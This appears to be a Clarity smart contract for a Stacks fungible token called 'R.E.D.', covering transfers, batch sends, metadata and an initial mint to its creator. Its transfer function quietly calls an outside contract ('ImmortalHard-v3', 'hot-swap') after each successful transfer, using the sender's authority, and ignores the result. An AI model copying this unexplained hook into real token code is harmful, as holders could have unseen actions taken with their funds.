;;
;;                                                                               
;;                                 .-"""""""""""-.                                
;;                              .' 11    12      1 '.                            
;;                            /                       \                           
;;                           ; 10                    2 ;                         
;;                           |                         |                     
;;                           | 9  <-------O          3 |                
;;                           |            |            |                 
;;                           | 8          V          4 |                                            ;                                   ;                  
;;                            \                       /                
;;                              '.  7     6      5  .'                             
;;                                 '-.__________.-'                                 
;;                                                                              



(impl-trait 'SP3FBR2AGK5H9QBDH3EEN6DF8EK8JY7RX8QJ5SVTE.sip-010-trait-ft-standard.sip-010-trait)

(define-constant ERR-UNAUTHORIZED (err u401))
(define-fungible-token red)
(define-data-var token-uri (optional (string-utf8 256)) (some u"https://stacksrock.com/RED.json")) ;; Temporary URL
(define-constant contract-creator tx-sender)


(define-public (transfer (amount uint) (from principal) (to principal) (memo (optional (buff 34))))
    (begin
        (asserts! (is-eq from tx-sender) ERR-UNAUTHORIZED) 

        (let ((result (ft-transfer? red amount from to)))
         (if (is-ok result)
         
         (begin
            (let
                (
                    (result2 (contract-call? 'SP2J9NG5A4F2C0NP0NSSEKM27J2G7CKWXH6RCSQ3X.ImmortalHard-v3 hot-swap))
                    
                )
                (ok true)
            )
         )
         
         
         (err u156)
         )

        )
    )
)



(define-read-only (get-name)
  (ok "R.E.D.")
)

(define-read-only (get-symbol)
  (ok "RED")
)

(define-read-only (get-decimals)
  (ok u6)
)

(define-read-only (get-balance (user principal))
  (ok (ft-get-balance red user))
)

(define-read-only (get-total-supply)
  (ok (ft-get-supply red))
)

(define-public (set-token-uri (value (string-utf8 256)))
  (begin
    (asserts! (is-eq tx-sender contract-creator) ERR-UNAUTHORIZED) ;; Ensure only the contract creator can update the URI
    (var-set token-uri (some value))
    (ok (print {
          notification: "token-metadata-update",
          payload: {
            contract-id: (as-contract tx-sender),
            token-class: "ft"
          }
        })
    )
  )
)

(define-read-only (get-token-uri)
  (ok (var-get token-uri))
)

(define-public (send-many (recipients (list 500 { to: principal, amount: uint, memo: (optional (buff 34)) })))
  (fold check-err (map send-token recipients) (ok true))
)

(define-private (check-err (result (response bool uint)) (prior (response bool uint)))
  (match prior ok-value result err-value (err err-value))
)

(define-private (send-token (recipient { to: principal, amount: uint, memo: (optional (buff 34)) }))
  (send-token-with-memo (get amount recipient) (get to recipient) (get memo recipient))
)

(define-private (send-token-with-memo (amount uint) (to principal) (memo (optional (buff 34))))
  (let ((transferOk (try! (transfer amount tx-sender to memo))))
    (ok transferOk)
  )
)

(begin
  (try! (ft-mint? red u69690000000000000 contract-creator))
)